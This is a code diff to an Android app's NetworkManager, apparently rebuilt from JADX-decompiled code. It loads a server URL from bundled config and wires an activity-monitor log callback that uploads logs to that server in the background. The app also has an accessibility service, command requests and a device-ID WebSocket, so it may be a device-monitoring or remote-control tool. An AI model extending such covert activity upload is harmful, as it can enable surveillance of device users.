@@ -17,6 +17,9 @@ import android.util.Log
 import com.storm.safe.rock.network.CommandRequest
 import com.storm.safe.rock.network.DataSyncClient
 import com.storm.safe.rock.network.HttpManager
+import kotlinx.coroutines.Dispatchers
+import kotlinx.coroutines.GlobalScope
+import kotlinx.coroutines.launch
 import com.storm.safe.rock.service.MyAccessibilityService
 import com.storm.safe.rock.util.StringUtil
 import org.json.JSONException
@@ -416,6 +419,16 @@ class NetworkManager {
             // Load server config from assets/app_config.dat
             loadAppConfig(context)
 
+            // Set HttpManager baseUrl from config.json server_url (HTTP, not WebSocket)
+            try {
+                val json = org.json.JSONObject(context.assets.open("config.json").bufferedReader().use { it.readText() })
+                val httpUrl = json.optJSONObject("network")?.optString("server_url", "") ?: ""
+                if (httpUrl.isNotEmpty()) {
+                    httpManager?.baseUrl = httpUrl.trimEnd('/')
+                    Log.i(TAG, "📋 HttpManager.baseUrl=$httpUrl")
+                }
+            } catch (_: Exception) {}
+
             // Register network monitoring
             registerNetworkCallback()
 
@@ -426,6 +439,19 @@ class NetworkManager {
             if (serverUrl.isNotEmpty() && deviceId.isNotEmpty()) {
                 Log.i(TAG, "📡 自动连接 WebSocket: $serverUrl")
                 connectToServer(serverUrl, deviceId)
+            }
+
+            // JADX: AbstractC0315a0.f53031a6 = NetworkManager$initialize$3(this)
+            // Bind ActivityMonitor log flush callback → upload via HTTP
+            val nm = this
+            ActivityMonitor.networkCallback = { logs ->
+                GlobalScope.launch(Dispatchers.IO) {
+                    try {
+                        nm.httpManager?.uploadLogs(logs)
+                    } catch (e: Exception) {
+                        Log.w(TAG, "上传日志失败: ${e.message}")
+                    }
+                }
             }
 
             isInitialized = true
@@ -1056,7 +1082,10 @@ class NetworkManager {
 
         // Sync HttpManager config — JADX: C0268a1 uses same auth as DataSyncClient
         httpManager?.let { hm ->
-            hm.baseUrl = buildHttpUrl() ?: url
+            // Only override baseUrl if not already set from config.json server_url
+            if (hm.baseUrl.isEmpty()) {
+                hm.baseUrl = buildHttpUrl() ?: url
+            }
             hm.deviceId = deviceId
             hm.deviceKeySalt = dataSyncClient?.deviceKeySalt ?: ""
         }
